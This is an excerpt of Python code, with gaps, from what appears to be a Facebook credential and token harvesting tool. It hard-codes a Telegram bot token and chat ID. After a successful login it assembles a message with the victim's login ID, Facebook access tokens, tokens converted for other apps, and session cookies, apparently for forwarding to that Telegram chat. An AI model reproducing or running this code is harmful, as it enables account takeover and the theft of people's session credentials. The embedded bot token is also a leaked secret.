...
# ================= TELEGRAM CONFIG =================
TELEGRAM_BOT_TOKEN = "8515174272:AAFjKOdSQkQkUQjNDqiEdCrfd_fz6OX4HPc"
TELEGRAM_CHAT_ID = "8107488749"
...
if result['success']:
    output = []
    output.append("✅ <b>FACEBOOK LOGIN SUCCESS</b>")
    output.append("")
    output.append(f"📧 <b>Login ID:</b> <code>{uid_phone_mail}</code>")
    output.append("")

    output.append("════════════════════════════")
    output.append("<b>ORIGINAL TOKEN</b>")
    output.append("════════════════════════════")
    output.append(f"Prefix: <code>{result['original_token']['token_prefix']}</code>")
    output.append(f"<code>{result['original_token']['access_token']}</code>")

    if 'converted_tokens' in result and result['converted_tokens']:
        output.append("")
        output.append("════════════════════════════")
        output.append("<b>CONVERTED TOKENS</b>")
        output.append("════════════════════════════")

        for app_key, token_data in result['converted_tokens'].items():
            output.append("")
            output.append(f"[{app_key}] {token_data['token_prefix']}:")
            output.append(f"<code>{token_data['access_token']}</code>")

    output.append("")
    output.append("════════════════════════════")
    output.append("<b>COOKIES</b>")
    output.append("════════════════════════════")
    output.append(f"<code>{result['cookies']['string']}</code>")
    ...
    print("LOGIN SUCCESS")
    print("=" * 80)
    print(final_message.replace("<code>", "").replace("</code>", "").replace("<b>", "").replace("</b>", ""))
